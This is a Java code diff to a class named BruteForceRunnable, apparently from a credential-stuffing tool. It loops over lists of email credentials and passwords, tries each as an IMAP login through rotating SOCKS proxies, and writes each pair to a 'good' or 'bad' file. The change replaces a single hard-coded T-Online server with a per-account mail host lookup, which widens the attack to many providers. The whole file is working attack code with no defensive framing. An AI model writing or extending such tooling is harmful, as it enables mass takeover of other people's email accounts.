@@ -6,9 +6,11 @@ import lombok.RequiredArgsConstructor;
 import org.bsoftware.parcel.domain.callbacks.BruteForceCallback;
 import org.bsoftware.parcel.domain.components.DataContainer;
 import org.bsoftware.parcel.domain.components.LogView;
+import org.bsoftware.parcel.domain.model.Connection;
 import org.bsoftware.parcel.domain.model.DataType;
 import org.bsoftware.parcel.domain.model.Proxy;
 import org.bsoftware.parcel.domain.model.Source;
+import org.bsoftware.parcel.utilities.ConnectionUtility;
 import org.bsoftware.parcel.utilities.FileSystemUtility;
 
 import java.io.IOException;
@@ -17,21 +19,11 @@ import java.io.IOException;
  * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
  *
  * @author Rudolf Barbu
- * @version 1.0.3
+ * @version 1.0.4
  */
 @RequiredArgsConstructor
 public class BruteForceRunnable implements Runnable
 {
-    /**
-     * Defines use or not SSL and TLS
-     */
-    private static final boolean SSL_AND_TLS = Boolean.TRUE;
-
-    /**
-     * Defines IMAP server port
-     */
-    private static final short IMAP_PORT = 993;
-
     /**
      * Defines connection timeout
      */
@@ -41,11 +33,6 @@ public class BruteForceRunnable implements Runnable
      * Defines Socks version
      */
     private static final byte SOCKS_VERSION = 5;
-
-    /**
-     * Defines IMAP server host link
-     */
-    private static final String IMAP_SERVER = "secureimap.t-online.de";
 
     /**
      * Indicator for proxy usage
@@ -65,10 +52,6 @@ public class BruteForceRunnable implements Runnable
     {
         final CkImap ckImap = new CkImap();
 
-        ckImap.put_Ssl(SSL_AND_TLS);
-        ckImap.put_StartTls(SSL_AND_TLS);
-        ckImap.put_Port(IMAP_PORT);
-
         if (useProxies)
         {
             ckImap.put_ConnectTimeout(CONNECTION_TIMEOUT);
@@ -80,16 +63,22 @@ public class BruteForceRunnable implements Runnable
             Source source;
             while (((source = DataContainer.getNextSource()) != null) && !Thread.currentThread().isInterrupted())
             {
-                if (useProxies && failedToConnect(ckImap))
+                final Connection connection = ConnectionUtility.getConnection(source.getCredential());
+
+                ckImap.put_Port(connection.getPort());
+                ckImap.put_Ssl(connection.isSsl());
+                ckImap.put_StartTls(connection.isTls());
+
+                if (useProxies && isFailedToConnect(ckImap, connection.getHost()))
                 {
                     break;
                 }
                 else
                 {
-                    ckImap.Connect(IMAP_SERVER);
+                    ckImap.Connect(connection.getHost());
                 }
 
-                FileSystemUtility.saveLineToFile(ckImap.Login(source.getCredential(), source.getPassword()) ? "good" : "bad", source);
+                FileSystemUtility.saveSourceToFile(ckImap.Login(source.getCredential(), source.getPassword()) ? "good" : "bad", source);
                 bruteForceCallback.handleDecrementCounter(DataType.SOURCE);
 
                 ckImap.Disconnect();
@@ -106,15 +95,16 @@ public class BruteForceRunnable implements Runnable
     /**
      * Get new proxy until they available
      *
-     * @param ckImap - imap object to probe connection
-     * @return true, when cannot connect to imap server
+     * @param ckImap - IMAP object to probe connection
+     * @param host - particular IMAP server to connect
+     * @return true, when cannot connect to IMAP server
      */
-    private boolean failedToConnect(final CkImap ckImap)
+    private boolean isFailedToConnect(final CkImap ckImap, final String host)
     {
         final CkString currentProxyHostname = new CkString();
 
         ckImap.get_SocksHostname(currentProxyHostname);
-        if (!currentProxyHostname.getString().isEmpty() && ckImap.Connect(IMAP_SERVER))
+        if (!currentProxyHostname.getString().isEmpty() && ckImap.Connect(host))
         {
             return Boolean.FALSE;
         }
@@ -126,7 +116,7 @@ public class BruteForceRunnable implements Runnable
             ckImap.put_SocksPort(proxy.getPort());
             bruteForceCallback.handleDecrementCounter(DataType.PROXY);
 
-            if (ckImap.Connect(IMAP_SERVER))
+            if (ckImap.Connect(host))
             {
                 return Boolean.FALSE;
             }
